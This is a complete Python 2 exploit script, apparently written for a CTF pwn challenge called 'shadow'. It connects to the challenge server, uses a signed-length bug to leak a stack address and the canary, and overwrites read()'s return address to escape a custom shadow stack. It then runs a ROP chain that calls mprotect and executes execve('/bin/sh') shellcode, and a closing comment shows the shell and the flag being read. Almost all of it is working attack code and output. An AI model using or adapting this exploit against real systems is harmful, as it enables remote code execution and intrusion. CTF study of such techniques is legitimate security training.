#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
import socket
import struct
import telnetlib

# --------------------------------------------------------------------------------------------------
def recv_until(st):  # receive until you encounter a string
    ret = ""
    while st not in ret:
        ret += s.recv(8192)

    return ret

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    s = socket.create_connection(('pwn2.chal.ctf.westerns.tokyo', 18294))
    # s = socket.create_connection(('localhost', 7777))

    f = s.makefile()                            # associate a file object with socket

    recv_until('Input name : ')                 # eat banner

    # -------------------------------------------------------------------------
    # leak a stack address
    # -------------------------------------------------------------------------
    name  = 'A' * 16                            # fill name buffer
    name += '32'                                # message length (for next operation)

    s.send(name + '\n')
    recv_until('Input message : ')              # Message Length was 32

    s.send('foo' + '\n')                        # send a dummy message

    r = recv_until('Change name? (y/n) :')
    off   = len('(1/3) <') + 16 + 4 + 4 + 4     # offset of stack addr. in response
    stack = struct.unpack("<L", r[off:off+4])[0]

    print '[*] Stack Address: ', hex(stack)

    # -------------------------------------------------------------------------
    # leak canary
    # -------------------------------------------------------------------------
    s.send('n' + '\n')                          # change name

    # Length check is signed, so give a negative length
    # .text:080488A6  cmp[ebp + msglen_30], 20h
    # .text:080488AA  jle short LEN_OK_80488B3
    recv_until('Message length : ')
    s.send('-9999' + '\n')

    recv_until('Input message : ')

    # now we can send an arbitrary long message
    # LSB of canary is NULL so it can't be leaked. Overwrite the LSB with a non NULL value
    # and let printf() to leak it.
    s.send('B' * 32 + 'C')

    r = recv_until('Change name? (y/n) :')
    # print list(r)

    off   = r.find('BBBBBBC') + 7               # offset of stack addr. in response
    canary = struct.unpack("<L", '\0' + r[off:off+3])[0]

    print '[*] Canary Value  :', hex(canary)

    # -------------------------------------------------------------------------
    # although shadow stack is implemented for our program, it's not implemented
    # for libc; If a call to read() overwrites it's own return address, it can
    # escape from shadow stack and return at arbitrary locations.
    #
    # canary is not needed as we get control before return from message()
    #
    # overwrite return address of getnline.read()
    # -------------------------------------------------------------------------
    s.send('n' + '\n')                          # don't change name

    recv_until('Message length : ')
    s.send('-9999' + '\n')                      # negative length again

    recv_until('Input message : ')

    # -------------------------------------------------------------------------
    # leaked stack: 0xffffd37c
    # esp before read(): 0xffffd27c (.asm:08048CEC    jmp eax)
    # offset is 0x100
    #
    ovfl  = 'D'*32                              # fill buffer
    ovfl += struct.pack("<L", canary)           # canary (not really needed)
    ovfl += 'E'*8                               # pad
    ovfl += struct.pack("<L", 0x61616161)       # ebp
    ovfl += struct.pack("<L", 0x62626262)       # eip
    ovfl += struct.pack("<L", stack - 0x100)    # buffer to write (retn of read())
    ovfl += struct.pack("<L", 0x00000100)       # change buffer size
    ovfl += struct.pack("<L", 0x00000011)       # overwrite limit of 3 times

    s.send(ovfl + '\n')

    r = recv_until('Input name : ')
    #   print list(r)

    # If send this command:
    # s.send('AAAA' + '\n')
    #
    # We get eip control:
    # Program terminated with signal SIGSEGV, Segmentation fault.
    # 0  0x41414141 in ?? ()
    #
    rop  = struct.pack("<L", 0x080484C0)            # .plt:080484C0  _mprotect proc near
    rop += struct.pack("<L", stack - 0x100 + 0x30)  # return to shellcode
    rop += struct.pack("<L", stack & 0xfffff000)    # arg1: page
    rop += struct.pack("<L", 0x1000)                # arg2: size = 1 page
    rop += struct.pack("<L", 7)                     # arg3: permissions = RWX
    rop += '\x90'*32                                # NOP sled
    rop += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
    rop += "\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

    s.send( rop + '\n' )

    # -------------------------------------------------------------------------
    # get shell
    # -------------------------------------------------------------------------
    print '[+] Opening Shell...'
    t = telnetlib.Telnet()              		# try to open shell
    t.sock = s
    t.interact()

# --------------------------------------------------------------------------------------------------
'''
/usr/bin/python2.7 /root/ctf/mmactf_16/shadow/shadow_expl.py
[*] Stack Address:  0xff8cd11c
[*] Canary Value : 0xc8b9b200
[+] Opening Shell...
id
    uid=18294034 gid=18294(p18294) groups=18294(p18294)
ls -la
    total 28
    drwxr-x--- 2 root p18294  4096 Sep  3 16:05 .
    drwxr-xr-x 6 root root    4096 Sep  2 23:49 ..
    -rw-r----- 1 root p18294    47 Sep  2 23:49 flag
    -rwxr-x--- 1 root p18294 12300 Sep  3 16:05 shadow
cat flag
    TWCTF{pr3v3n7_ROP_u51ng_h0m3m4d3_5h4d0w_574ck}
exit
*** Connection closed by remote host ***

Process finished with exit code 0
'''
# --------------------------------------------------------------------------------------------------
